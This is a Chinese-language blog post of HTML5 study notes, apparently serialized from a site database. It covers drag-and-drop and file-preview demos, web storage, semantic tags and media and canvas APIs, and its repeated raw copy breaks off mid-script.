ev.dataTransfer.getData(\"Text\");\n\t\t\tev.target.appendChild(document.getElementById(data));\n\t\t}\n\t</script>\n\t\n\t</body>\n\t</html>\n\n整个过程可解析为如下过程：\n\n1. **设置元素为可拖放**——draggable 属性\n\n\t\t`<img draggable=\"true\" />`\n\n2. **拖动什么** ——ondragstart 和 setData()\n<br>在上面的例子中，ondragstart 属性调用了一个函数，drag(event)，它规定了被拖动的数据。dataTransfer.setData() 方法设置被拖数据的数据类型和值。\n\n> [参考链接](http://www.tuicool.com/articles/j6Zbam)\n\n\t\tfunction drag(ev) {\n\t\t\tev.dataTransfer.setData(\"Text\",ev.target.id);\n\t\t}\n\n\t在这个例子中，数据类型是 \"Text\"，值是可拖动元素的 id (\"drag1\")。\n\n3. **拖动过程中**——ondrag\n<br>拖动过程中，在被拖拉的节点上持续触发。\n\n4. **放到何处** ——ondragover和getData()\n<br>ondragover 事件规定在何处放置被拖动的数据。\n默认地，无法将数据/元素放置到其他元素中。如果需要设置允许放置，我们必须阻止对元素的默认处理方式。\n这要通过调用 ondragover 事件的 event.preventDefault() 方法。\n\n\t\tevent.preventDefault()\n\n5. **进行放置** ——ondrop\n<br>当放置被拖数据时，会发生 drop 事件。在上面的例子中，ondrop 属性调用了一个函数，drop(event)。\n\n\t\tfunction drop(ev) {\n\t\t\tev.preventDefault();\n\t\t\tvar data=ev.dataTransfer.getData(\"Text\");\n\t\t\tev.target.appendChild(document.getElementById(data));\n\t\t}\n\n> 代码解释：\n\n> * 调用 preventDefault() 来避免浏览器对数据的默认处理（drop 事件的默认行为是以链接形式打开）\n* 通过 dataTransfer.getData(\"Text\") 方法获得被拖的数据。该方法将返回在 setData() 方法中设置为相同类型的任何数据。\n* 被拖数据是被拖元素的 id (\"drag1\")\n* 把被拖元素追加到放置元素（目标元素）中\n\n其他事件和方法：\n\n* **dragend事件**：\n拖拉结束时（释放鼠标键或按下escape键）在被拖拉的节点上触发，该事件的target属性是被拖拉的节点。它与dragStart事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，dragend事件总是会触发的。\n* **dragenter事件**：拖拉进入当前节点时，在当前节点上触发，该事件的target属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。\n* **dragover事件**：拖拉到当前节点上方时，在当前节点上持续触发，该事件的target属性是当前节点。该事件与dragenter事件基本类似，默认会重置当前的拖拉事件的效果（DataTransfer对象的dropEffect属性）为none，即不允许放下被拖拉的节点，所以如果允许在当前节点drop数据，通常会使用preventDefault方法，取消重置拖拉效果为none。\n* **event.dataTransfer.setDragImage(element,x,y)方法**：设置拖放操作的自定义图标。其中element设置自定义图标，x设置图标与鼠标在水平方向上的距离，y设置图标与鼠标在垂直方向上的距离。\n\n####H5拖拽常用功能\n\n> HTML5文件拖拽预览Demo\n\n\t<!DOCTYPE html>\n\t<html>\n\t <head> \n\t  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n\t  <title>HTML5文件拖拽预览Demo</title> \n\t  <style type=\"text/css\">\n\t  \th1 {\n\t\t\tpadding: 0px;\n\t\t\tmargin: 0px;\n\t\t}\n\t\tdiv#show {\n\t\t\tborder: 1px solid #ccc;\n\t\t\twidth: 400px;\n\t\t\theight: 300px;\n\t\t\tdisplay: -moz-box;\n\t\t\tdisplay: -webkit-box;\n\t\t\t-moz-box-align: center;\n\t\t\t-webkit-box-align: center;\n\t\t\t-moz-box-pack: center;\n\t\t\t-webkit-box-pack: center;\n\t\t\tresize: both;\n\t\t\toverflow: auto;\n\t\t}\n\t\tdiv[id^=show]:hover {\n\t\t\tborder: 1px solid #333;\n\t\t}\n\t\tdiv#main {\n\t\t\twidth: 100%;\n\t\t}\n\t\tdiv#successLabel {\n\t\t\tcolor: Red;\n\t\t}\n\t\tdiv#content {\n\t\t\tdisplay: none;\n\t\t}    \n\t</style> \n\t  <script type=\"text/javascript\">\n\t  \tfunction init() {\n\t    \tvar dest = document.getElementById(\"show\");\n\t    \tdest.addEventListener(\"dragover\",\n\t    \t\tfunction(ev) {\n\t\t\t        ev.stopPropagation();\n\t\t\t        ev.preventDefault();\n\t\t\t    },\n\t    \tfalse);\n\t\t    dest.addEventListener(\"dragend\",\n\t\t\t    function(ev) {\n\t\t\t        ev.stopPropagation();\n\t\t\t        ev.preventDefault();\n\t\t\t    },\n\t\t    false);\n\t    \tdest.addEventListener(\"drop\",\n\t\t\t    function(ev) {\n\t\t\t        ev.stopPropagation();\n\t\t\t        ev.preventDefault();\n\t\t\t        console.log(ev.dataTransfer) var file = ev.dataTransfer.files[0];\n\t\t\t        var reader = new FileReader();\n\t\t\t        if (file.type.substr(0, 5) == \"image\") {\n\t\t\t            reader.onload = function(event) {\n\t\t\t                dest.style.background = 'url(' + event.target.result + ') no-repeat center';\n\t\t\t                dest.innerHTML = \"\";\n\t\t\t            };\n\t\t\t            reader.readAsDataURL(file);\n\t\t\t        } else if (file.type.substr(0, 4) == \"text\") {\n\t\t\t            reader.readAsText(file);\n\t\t\t            reader.onload = function(f) {\n\t\t\t                dest.innerHTML = \"<pre>\" + this.result + \"</pre>\";\n\t\t\t                dest.style.background = \"white\";\n\t\t\t            }\n\t\t\t        } else {\n\t\t\t            dest.innerHTML = \"暂不支持此类文件的预览\";\n\t\t\t            dest.style.background = \"white\";\n\t\t\t        }\n\t\t\t    },\n\t   \t\tfalse);\n\t\t} \n\t\t//设置页面属性，不执行默认处理（拒绝被拖放）\n\t\t// document.ondragover = function(e) {\n\t\t//     e.preventDefault();\n\t\t// };\n\t\t// document.ondrop = function(e) {\n\t\t//     e.preventDefault();\n\t\t// }\n\t\t// window.onload = init;\n\t\n\t  </script>\n\t </head>\n\t <body> \n\t  <h1>HTML5文件拖拽预览Demo</h1> \n\t  <div id=\"show\">\n\t    文件预览区，仅限图片和txt文件 \n\t  </div>\n\t </body>\n\t</html>\n\n\n\n## Web存储\n\nHTML5 提供了两种在客户端存储数据的新方法：\n\n* localStorage - 没有时间限制的数据存储\n* sessionStorage - 针对一个 session 的数据存储\n\n之前，这些都是由 cookie 完成的。但是 cookie 不适合大量数据的存储，因为它们由每个对服务器的请求来传递，这使得 cookie 速度很慢而且效率也不高。\n\n在 HTML5 中，数据不是由每个服务器请求传递的，而是只有在请求时使用数据。它使在不影响网站性能的情况下存储大量数据成为可能。\n对于不同的网站，数据存储于不同的区域，并且一个网站只能访问其自身的数据。\nHTML5 使用 JavaScript 来存储和访问数据。\n\n#### localStorage方法\n\nlocalStorage 方法存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。\n\n这个例子创建并访问了 localStorage：\n\n\t<script type=\"text/javascript\">\n\t\tlocalStorage.lastname=\"Smith\";\n\t\tdocument.write(localStorage.lastname);\n\t</script>\n\n下面的例子对用户访问页面的次数进行计数：\n\n\t<script type=\"text/javascript\">\n\t\tif (localStorage.pagecount) {\n\t\t  \tlocalStorage.pagecount=Number(localStorage.pagecount) +1;\n\t\t}\n\t\telse {\n\t\t \tlocalStorage.pagecount=1;\n\t\t}\n\t\tdocument.write(\"Visits \"+ localStorage.pagecount + \" time(s).\");\n\t</script>\n\n#### sessionStorage方法\n\nsessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。\n\n创建并访问一个 sessionStorage：\n\n\t<script type=\"text/javascript\">\n\t\tsessionStorage.lastname=\"Smith\";\n\t\tdocument.write(sessionStorage.lastname);\n\t</script>\n\n应用——统计用户在当前 session 中访问页面的次数进行计数：\n\n\t<script type=\"text/javascript\">\n\t\tif (sessionStorage.pagecount) {\n\t\t  \tsessionStorage.pagecount=Number(sessionStorage.pagecount) +1;\n\t\t}\n\t\telse {\n\t\t \tsessionStorage.pagecount=1;\n\t\t}\n\t\tdocument.write(\"Visits \"+sessionStorage.pagecount+\" time(s) this session.\");\n\t</script>\n\n## H5标签\n\n### nav标签\n\n\t<nav>\n\t\t<a href=\"index.asp\">Home</a>\n\t\t<a href=\"html5_meter.asp\">Previous</a>\n\t\t<a href=\"html5_noscript.asp\">Next</a>\n\t</nav>\n\n##### 定义和用法\n\n`<nav>`定义导航链接的部分。\n\n> 如果文档中有“前后”按钮，则应该把它放到 `<nav>` 元素中。\n\n### section标签\n\n\t<section>\n\t  <h1>PRC</h1>\n\t  <p>The People's Republic of China was born in 1949...</p>\n\t</section>\n\n##### 定义和用法\n\n`<section>` 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。\n\n### header标签\n\n\t<header>\n\t\t<h1>Welcome to my homepage</h1>\n\t\t<p>My name is Donald Duck</p>\n\t</header>\n\n\t<p>The rest of my home page...</p>\n\n##### 定义和用法\n\n`<header>`定义 section 或 page 的页眉（介绍信息）。\n\n### footer标签\n\n\t<footer>\n\t  \t<p>Posted by: Ajun</p>\n\t  \t<p>Contact information: <a href=\"mailto:774271383@qq.com\">774271383@qq.com</a>.</p>\n\t</footer>\n\n##### 定义和用法\n\n`<footer>` 标签定义文档或节的页脚。\n\n页脚通常包含文档的作者、版权信息、使用条款链接、联系信息等等。\n一个文档中可以使用多个 `<footer>` 元素。\n\n> `<footer>` 元素内的联系信息应该位于 `<address>` 标签中。\n\n### output标签\n\n\t<form oninput=\"x.value=parseInt(a.value)+parseInt(b.value)\">0\n\t   \t<input type=\"range\" id=\"a\" value=\"50\">100+<input type=\"number\" id=\"b\" value=\"50\">\n\t   \t=<output name=\"x\" for=\"a b\">100</output>\n\t</form> \n\n##### 定义和用法\n\n`<output>`定义不同类型的输出，比如脚本的输出。\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|for\t|element_id\t|定义输出域相关的一个或多个元素。|\n|form\t|form_id\t|定义输入字段所属的一个或多个表单。|\n|name\t|name\t|定义对象的唯一名称。（表单提交时使用）|\n\n### progress标签\n\n\t<progress value=\"22\" max=\"100\"></progress> \n\n##### 浏览器支持\n\nInternet Explorer 9 以及更早的版本不支持 `<progress>` 标签。\n\n##### 定义和用法\n\n`<progress>` 标签标示任务的进度（进程）。\n\n> 结合`<progress>`标签与 JavaScript 一同使用，来显示任务的进度。\n注意不适合用来表示度量衡（例如，磁盘空间使用情况或查询结果）。如需表示度量衡，请使用 `<meter>` 标签代替。\n\n### article标签\n\n\t<article>\n\t  \t<h1>Internet Explorer 9</h1>\n\t  \t<p>Windows Internet Explorer 9（简称 IE9）于2011年3月14日发布。</p>\n\t</article>\n\n##### 定义和用法\n\n`<article>` 标签规定独立的自包含内容。一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发。\n\n`<article>` 元素的潜在来源：\n\n* 论坛帖子\n* 报纸文章\n* 博客条目\n* 用户评论\n\n### aside标签\n\n\t<p>Me and my family visited The Epcot center this summer.</p>\n\t<aside>\n\t\t<h4>Epcot Center</h4>\n\t\tThe Epcot Center is a theme park in Disney World, Florida.\n\t</aside>\n\n##### 定义和用法\n\n`<aside>`标签定义其所处内容之外的内容。aside的内容应该与附近的内容相关。\n\n### bdi标签\n\n\t<ul>\n\t\t<li>Username <bdi>Bill</bdi>:80 points</li>\n\t\t<li>Username <bdi>Steve</bdi>: 78 points</li>\n\t</ul>\n\n##### 定义和用法\n\nbdi 指的是 bidi 隔离。\n\n`<bdi>` 标签允许您设置一段文本，使其脱离其父元素的文本方向设置。在发布用户评论或其他您无法完全控制的内容时，该标签很有用。\n\n### command标签\n\n\t<menu>\n\t\t<command onclick=\"alert('Hello World')\">Click Me!</command>\n\t</menu>\n\n##### 浏览器支持\n\n目前只有 Internet Explorer 支持 `<command>` 标签。(自己测试怎么IE也不行)\n\n##### 定义和用法\n\ncommand 元素表示用户能够调用的命令。可以定义命令按钮，比如单选按钮、复选框或按钮。\n\n只有当 command 元素位于 menu 元素内时，该元素才是可见的。否则不会显示这个元素，但是可以用它规定键盘快捷键。\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|checked\t|checked\t|定义是否被选中。仅用于 radio 或 checkbox 类型。|\n|disabled\t|disabled\t|定义 command 是否可用。|\n|icon\t|url\t|定义作为 command 来显示的图像的 url。|\n|label\t|text\t|为 command 定义可见的 label。|\n|radiogroup\t|groupname\t|定义 command 所属的组名。仅在类型为 radio 时使用。|\n|type\t|checkbox<br>command<br>radio |定义该 command 的类型。默认是 \"command\"。|\n\n### datalist标签\n\n\t<input id=\"myCar\" list=\"cars\" />\n\t<datalist id=\"cars\">\n\t  <option value=\"BMW\">宝马</option>\n\t  <option value=\"Ford\">福特</option>\n\t  <option value=\"Volvo\">沃尔沃</option>\n\t</datalist>\n\n##### 定义和用法\n\n`<datalist>`标签定义下拉选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。\n\ndatalist 及其选项不会被显示出来，它仅仅是合法的输入值列表。\n\n> * 请使用 input 元素的 list 属性来绑定 datalist。\n  * 注意value属性值为选项内容，option标签内为当前选项内容的注释。\n  * 区别与select标签的区分，输入方式也有所不同。\n\n### details标签\n\n\t<details>\n\t\t<summary>Copyright 2011.</summary>\n\t\t<p>All pages and graphics on this web site are the property of W3School.</p>\n\t</details>\n\n> 与`<summary>`标签配合使用可以为details定义标题。标题是可见的，用户点击标题时，会显示出 details。若不定义summary则标题显示详细信息。\n\n##### 定义和用法\n\n定义元素的细节，用于描述文档或文档某个部分的细节。\n\n##### 浏览器支持\n\n目前只有 Chrome 支持 `<details>` 标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。\n\n##### 属性\n\nopen属性，只有一个值“open”，定义 details 内的内容默认可见。\n\n### dialog标签\n\n\t<table border=\"1\">\n\t<tr>\n\t  <th>一月 <dialog open>这是打开的对话窗口</dialog></th>\n\t  <th>二月</th>\n\t  <th>三月</th>\n\t</tr>\n\t<tr>\n\t  <td>31</td>\n\t  <td>28</td>\n\t  <td>31</td>\n\t</tr>\n\t</table>\n\n##### 定义和用法\n\n定义对话框或窗口。\n\n##### 属性\n\nopen属性，只有一个值“open”，规定 dialog 元素是活动的，用户可与之交互。\n\n##### 浏览器支持\n\n目前只有 Chrome 和 Safari 6 支持 <dialog> 标签。\n\n### embed标签\n\n\t<embed src=\"helloworld.swf\" />\n\n##### 定义和用法\n\n定义嵌入的内容，可以用来插入各种多媒体，格式可以是Swf、Midi、Wav、AIFF、AU、MP3等等。\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|height\t|pixels\t|设置嵌入内容的高度。|\n|src\t|url\t|嵌入内容的 URL。|\n|type\t|type\t|定义嵌入内容的类型。|\n|width\t|pixels\t|设置嵌入内容的宽度。|\n\n### figure标签\n\n\t<figure>\n\t  <p>黄浦江上的的卢浦大桥</p>\n\t  <img src=\"shanghai_lupu_bridge.jpg\" width=\"350\" height=\"234\" />\n\t</figure>\n\n##### 定义和用法\n\n`<figure>` 标签规定独立的流内容（图像、图表、照片、代码等等）,定义媒介内容的分组，以及它们的标题。其内容应该与主内容相关，但如果被删除，则不应对文档流产生影响。\n\n> 使用 `<figcaption>` 元素为 figure 添加标题（caption）。\n\n### input标签\n\nH5新增许多其属性，列表如下\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|accept\t|mime_type\t|规定通过文件上传来提交的文件的类型。|\n|align\t|left<br>right<br>top<br>middle<br>bottom |不赞成使用。规定图像输入的对齐方式。|\n|alt\t|text\t|定义图像输入的替代文本。|\n|autocomplete\t|on<br>off|规定是否使用输入字段的自动完成功能。|\n|autofocus\t|autofocus\t|规定输入字段在页面加载时是否获得焦点。（不适用于 type=\"hidden\"）|\n|checked\t|checked\t|规定此 input 元素首次加载时应当被选中。|\n|disabled\t|disabled\t|当 input 元素加载时禁用此元素。|\n|form\t|formname\t|规定输入字段所属的一个或多个表单。|\n|formaction\t|URL\t|覆盖表单的 action 属性。（适用于 type=\"submit\" 和 type=\"image\"）|\n|formenctype\t|见注释\t|覆盖表单的 enctype 属性。（适用于 type=\"submit\" 和 type=\"image\"）|\n|formmethod\t|get<br>post|覆盖表单的 method 属性。（适用于 type=\"submit\" 和 type=\"image\"）|\n|formnovalidate\t|formnovalidate\t|覆盖表单的 novalidate 属性。如果使用该属性，则提交表单时不进行验证。|\n|formtarget\t|_blank<br>_self<br>_parent<br>_top<br>framename|覆盖表单的 target 属性。（适用于 type=\"submit\" 和 type=\"image\"）|\n|height\t|pixels<br>%|定义 input 字段的高度。（适用于 type=\"image\"）|\n|list\t|datalist-id\t|引用包含输入字段的预定义选项的 datalist 。|\n|max\t|number<br>date|规定输入字段的最大值。请与 \"min\" 属性配合使用，来创建合法值的范围。|\n|maxlength\t|number\t|规定输入字段中的字符的最大长度。|\n|min\t|number<br>date|规定输入字段的最小值。请与 \"max\" 属性配合使用，来创建合法值的范围。|\n|multiple\t|multiple\t|如果使用该属性，则允许一个以上的值。|\n|name\t|field_name\t|定义 input 元素的名称。|\n|pattern\t|regexp_pattern\t|规定输入字段的值的模式或格式。例如 pattern=\"[0-9]\" 表示输入值必须是 0 与 9 之间的数字。|\n|placeholder\t|text\t|规定帮助用户填写输入字段的提示。|\n|readonly\t|readonly\t|规定输入字段为只读。|\n|required\t|required\t|指示输入字段的值是必需的。|\n|size\t|number_of_char\t|定义输入字段的宽度。|\n|src\t|URL\t|定义以提交按钮形式显示的图像的 URL。|\n|step\t|number\t|规定输入字的的合法数字间隔。|\n|type\t|button<br>checkbox<br>file<br>hidden<br>image<br>password<br>radio<br>reset<br>submit<br>text|规定 input 元素的类型。|\n|value\t|value\t|规定 input 元素的值。|\n|width\t|pixels<br>%|定义 input 字段的宽度。（适用于 type=\"image\"）|","source":"_posts/HTML5新特性笔记.md","raw":"---\n\ntitle: HTML5新特性\ntags: [html]\n\n---\n\n### 目录\n\n* 用于绘画的 canvas 元素\n* 用于媒介回放的 video 和 audio 元素\n* 对本地离线存储的更好的支持\n* 新的特殊内容元素，比如 article、footer、header、nav、section\n* 新的表单控件，比如 calendar、date、time、email、url、search\n\n<!-- more -->\n\n## video标签\n\n\t<video width=\"320\" height=\"240\" controls=\"controls\" autoplay=\"autoplay\" loop=\"loop\">\n\t  \t<source src=\"movie.ogg\" type=\"video/ogg\">\n\t  \t<source src=\"movie.mp4\" type=\"video/mp4\">\n\t\tYour browser does not support the video tag.\n\t</video>\n\n* width：定义播放器宽度\n* height： 设置视频播放器的高度\n* controls：如果出现该属性，则向用户显示控件，播放按钮，音量，进度条，下载按钮等\n* autoplay： 如果出现该属性，则视频在就绪后马上播放。\n* loop：如果出现该属性，则当媒介文件完成播放后再次开始播放\n* preload：如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 \"autoplay\"，则忽略该属性\n* src：要播放的视频的 URL，也可以像上例中写在source标签里\n\nvideo 元素允许多个 source 元素。source 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式。\n\n`<video>` 与`</video>` 之间插入的内容是供不支持 video 元素的浏览器显示的：\n\n#### 支持格式\n\n|格式\t|IE\t\t|Firefox\t|Opera\t|Chrome|Safari|\n|-----------|-----------|----------|-----------|----------|--------|\n|Ogg\t|No\t\t|3.5+\t|10.5+\t|5.0+\t|No\t    |\n|MPEG 4\t|9.0+\t|No\t\t|No\t\t|5.0+\t|3.0+   |\n|WebM\t|No\t\t|4.0+\t|10.6+\t|6.0+\t|No      |\n\n* Ogg = 带有 Theora 视频编码和 Vorbis 音频编码的 Ogg 文件\n* MPEG4 = 带有 H.264 视频编码和 AAC 音频编码的 MPEG 4 文件\n* WebM = 带有 VP8 视频编码和 Vorbis 音频编码的 WebM 文件\n\n#### 方法，属性和事件\n\n|方法\t\t\t|属性\t\t\t|事件\t\t\t\t|\n|---------------|---------------|-------------------|\n|play()\t\t\t|currentSrc\t\t|play\t\t\t\t|\n|pause()\t\t|currentTime\t|pause\t\t\t\t|\n|load()\t\t\t|videoWidth\t\t|progress\t\t\t|\n|canPlayType\t|videoHeight\t|error\t\t\t\t|\n| \t\t\t\t|duration\t\t|timeupdate\t\t\t|\n|\t\t\t\t|ended\t\t\t|ended\t\t\t\t|\n|\t\t\t\t|error\t\t\t|abort\t\t\t\t|\n|\t\t\t\t|paused\t\t\t|empty\t\t\t\t|\n|\t\t\t\t|muted\t\t\t|emptied\t\t\t|\n|\t\t\t\t|seeking\t\t|waiting\t\t\t|\n|\t\t\t\t|volume\t\t\t|loadedmetadata\t\t|\n|\t\t\t\t|height\t\t\t| \t\t\t\t\t|\n|\t\t\t\t|width\t \t\t|\t\t\t\t\t||\n\n> 在所有属性中，只有 videoWidth 和 videoHeight 属性是立即可用的。在视频的元数据已加载后，其他属性才可用。\n\n## audio标签\n\n\t<audio src=\"song.ogg\" controls=\"controls\">\n\t\tYour browser does not support the audio tag.\n\t</audio>\n\n* autoplay：如果出现该属性，则音频在就绪后马上播放。\n* controls：如果出现该属性，则向用户显示控件，比如播放按钮。\n* loop：如果出现该属性，则每当音频结束时重新开始播放。\n* preload：如果出现该属性，则音频在页面加载时进行加载，并预备播放。如果使用 \"autoplay\"，则忽略该属性。\n* src：要播放的音频的 URL。\n\naudio 元素允许多个 source 元素。source 元素可以链接不同的音频文件。浏览器将使用第一个可识别的格式。\n\n`<audio>` 与 `</audio>` 之间插入的内容是供不支持 audio 元素的浏览器显示的。\n\n\n#### 支持格式\n\n|格式\t|IE9\t\t|Firefox3.5\t|Opera10.5\t|Chrome3.0|Safari3.0|\n|-----------|----------|-----------------|-----------------|---------------|-----------|\n|Ogg Vorbis\t|\t|YES\t\t\t|YES\t\t \t|YES\t         \t\t|\t        |\n|MP3\t|YES\t\t|\t\t\t|\t\t\t|YES\t\t\t|YES  \t|\n|Wav\t|\t\t|YES\t\t\t|YES\t\t\t|\t\t\t|YES      \t|\n\n## canvas\n\n\t<canvas id=\"myCanvas\"></canvas>\n\n\t<script type=\"text/javascript\">\n\t\tvar canvas=document.getElementById('myCanvas');\n\t\tvar ctx=canvas.getContext('2d');\n\t\tctx.fillStyle='#FF0000';\n\t\tctx.fillRect(0,0,80,100);\n\t</script>\n\n##### 浏览器支持\n\nInternet Explorer 8 以及更早的版本不支持 `<canvas> `标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。\n\n##### 标签定义和用法\n\n`<canvas>` 标签定义图形，比如图表和其他图像。但是它只提供图形容器，必须使用javascript来绘制图形。\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|height\t|pixels\t|设置 canvas 的高度。|\n|width\t|pixels\t|设置 canvas 的宽度。|\n\n#### 使用javascript绘制\n\n[W3School参考链接](http://www.w3school.com.cn/tags/html_ref_canvas.asp)\n\n##### 颜色、样式和阴影\n\n|属性\t|描述|\n|-------|---|\n|fillStyle\t|设置或返回用于填充绘画的颜色、渐变或模式|\n|strokeStyle\t|设置或返回用于笔触的颜色、渐变或模式|\n|shadowColor\t|设置或返回用于阴影的颜色|\n|shadowBlur\t|设置或返回用于阴影的模糊级别|\n|shadowOffsetX\t|设置或返回阴影距形状的水平距离|\n|shadowOffsetY\t|设置或返回阴影距形状的垂直距离|\n\n|方法\t|描述|\n|-------|---|\n|createLinearGradient()\t|创建线性渐变（用在画布内容上）|\n|createPattern()\t|在指定的方向上重复指定的元素|\n|createRadialGradient()\t|创建放射状/环形的渐变（用在画布内容上）|\n|addColorStop()\t|规定渐变对象中的颜色和停止位置|\n\n##### 线条样式\n\n|属性\t|描述|\n|-------|---|\n|lineCap\t|设置或返回线条的结束端点样式|\n|lineJoin\t|设置或返回两条线相交时，所创建的拐角类型|\n|lineWidth\t|设置或返回当前的线条宽度|\n|miterLimit\t|设置或返回最大斜接长度|\n\n##### 矩形\n\n|方法\t|描述|\n|-------|---|\n|rect()\t|创建矩形|\n|fillRect()\t|绘制“被填充”的矩形|\n|strokeRect()\t|绘制矩形（无填充）|\n|clearRect()\t|在给定的矩形内清除指定的像素|\n\n##### 路径\n\n|方法\t|描述|\n|-------|---|\n|fill()\t|填充当前绘图（路径）|\n|stroke()\t|绘制已定义的路径|\n|beginPath()\t|起始一条路径，或重置当前路径|\n|moveTo()\t|把路径移动到画布中的指定点，不创建线条|\n|closePath()\t|创建从当前点回到起始点的路径|\n|lineTo()\t|添加一个新点，然后在画布中创建从该点到最后指定点的线条|\n|clip()\t|从原始画布剪切任意形状和尺寸的区域|\n|quadraticCurveTo()\t|创建二次贝塞尔曲线|\n|bezierCurveTo()\t|创建三次方贝塞尔曲线|\n|arc()\t|创建弧/曲线（用于创建圆形或部分圆）|\n|arcTo()\t|创建两切线之间的弧/曲线|\n|isPointInPath()\t|如果指定的点位于当前路径中，则返回 true，否则返回 false|\n\n##### 转换\n\n|方法\t|描述|\n|-------|---|\n|scale()\t|缩放当前绘图至更大或更小|\n|rotate()\t|旋转当前绘图|\n|translate()\t|重新映射画布上的 (0,0) 位置|\n|transform()\t|替换绘图的当前转换矩阵|\n|setTransform()\t|将当前转换重置为单位矩阵。然后运行 transform()|\n\n##### 文本\n\n|属性\t|描述|\n|-------|---|\n|font\t|设置或返回文本内容的当前字体属性|\n|textAlign\t|设置或返回文本内容的当前对齐方式|\n|textBaseline\t|设置或返回在绘制文本时使用的当前文本基线|\n\n|方法\t|描述|\n|-------|---|\n|fillText()\t|在画布上绘制“被填充的”文本|\n|strokeText()\t|在画布上绘制文本（无填充）|\n|measureText()\t|返回包含指定文本宽度的对象|\n\n\n##### 图像绘制\n\n|方法\t|描述|\n|-------|---|\n|drawImage()\t|向画布上绘制图像、画布或视频|\n\n##### 像素操作\n\n|属性\t|描述|\n|-------|---|\n|width\t|返回 ImageData 对象的宽度|\n|height\t|返回 ImageData 对象的高度|\n|data\t|返回一个对象，其包含指定的 ImageData 对象的图像数据|\n\n|方法\t|描述|\n|-------|---|\n|createImageData()\t|创建新的、空白的 ImageData 对象|\n|getImageData()\t|返回 ImageData 对象，该对象为画布上指定的矩形复制像素数据|\n|putImageData()\t|把图像数据（从指定的 ImageData 对象）放回画布上|\n\n#####　合成\n\n|属性\t|描述|\n|-------|---|\n|globalAlpha\t|设置或返回绘图的当前 alpha 或透明值|\n|globalCompositeOperation\t|设置或返回新图像如何绘制到已有的图像上|\n\n##### 其他\n\n|方法\t|描述|\n|-------|---|\n|save()\t|保存当前环境的状态|\n|restore()\t|返回之前保存过的路径状态和属性|\n|createEvent()\t ||\n|getContext()\t ||\n|toDataURL()|||\n\n> **`<canvas>` 标记和 SVG 以及 VML 之间的差异**\n`<canvas> `有一个基于 JavaScript 的绘图 API，而 SVG 和 VML 使用一个 XML 文档来描述绘图。\n这两种方式在功能上是等同的，任何一种都可以用另一种来模拟。从表面上看，它们很不相同，可是，每一种都有强项和弱点。例如，SVG 绘图很容易编辑，只要从其描述中移除元素就行。\n要从同一图形的一个 `<canvas>` 标记中移除元素，往往需要擦掉绘图重新绘制它。\n\n## 拖放\n\n\t<!DOCTYPE HTML>\n\t<html>\n\t<head>\n\t<style type=\"text/css\">\n\t\t#div1, #div2, #div3, #div4{\n\t\t\tfloat:left; \n\t\t\twidth:100px;\n\t\t\theight:100px;\n\t\t\tmargin:10px;\n\t\t\tpadding:10px;\n\t\t\tborder:1px solid #aaaaaa;\n\t\t}\n\t\t*{\n\t\t\ttransition:all 0.5s;\n\t\t}\n\t\t#dragDiv{\n\t\t\tbackground-color: #369;\n\t\t\twidth:100px;\n\t\t\theight:100px;\n\t\t}\n\t\t#mouseLocation{\n\t\t\tclear: both;\n\t\t\twidth: 265px;\n\t\t\tmargin-left: 10px;\n\t\t\ttext-align: center;\n\t\t}\n\t\t#crossDiv{\n\t\t\tclear: both;\n\t\t\tdisplay: inline-block;\n\t\t\theight: 200px;\n\t\t\twidth: 10px;\n\t\t\tbackground-color: #333;\n\t\t}\n\t\t#dragElement{\n\t\t\tfloat: left;\n\t\t\twidth: 120px;\n\t\t\theight: 120px;\n\t\t\tbackground-color: #369;\n\t\t\tmargin-left: -99999px;\n\t\t\topacity: 1;\n\t\t}\n\t\t#dragElement:click{\n\t\t\twidth: 150px;\n\t\t\theight: 150px;\n\t\t}\n\t</style>\n\t</head>\n\t<body>\n\t\n\t<div id=\"div1\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\" ondragleave=\"dragLeave(event)\">\n\t\t<div id=\"dragDiv\" draggable=\"true\" ondragstart=\"drag(event)\" ondrag=\"draging(event)\" ></div>\n\t</div>\n\t<div id=\"div2\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\" ondragleave=\"dragLeave(event)\"></div>\n\t<div id=\"mouseLocation\">X坐标：0，Y坐标：0</div>\n\t<div id=\"dragElement\"></div>\n\t<div id=\"div3\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\"></div>\n\t<div id=\"div4\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\"></div>\n\t\n\t<script type=\"text/javascript\">\n\t\tvar mouseLocation = document.getElementById(\"mouseLocation\");\n\t\tvar dragElement = document.getElementById(\"dragElement\");\n\t\n\t\tfunction draging(ev) {\n\t\t\tmouseLocation.innerHTML = \"X坐标：\" + ev.clientX + \"，Y坐标：\" + ev.clientY;\n\t\t}\n\t\n\t\tfunction allowDrop(ev){\n\t\t\tev.preventDefault();\n\t\t\tmouseLocation.style.backgroundColor = \"#333\";\n\t\t\tmouseLocation.style.color = \"#fff\";\n\t\t\tev.dataTransfer.dropEffect = \"copy\";\n\t\t}\n\t\n\t\tfunction dragLeave(ev) {\n\t\t\tmouseLocation.style.backgroundColor = \"#fff\";\n\t\t\tmouseLocation.style.color = \"#000\";\n\t\t}\n\t\n\t\tfunction drag(ev){\n\t\t\tev.dataTransfer.setData(\"Text\",ev.target.id);\n\t\t\tev.dataTransfer.setDragImage(dragElement, 60, 60);\n\t\t\tev.dataTransfer.effectAllowed = 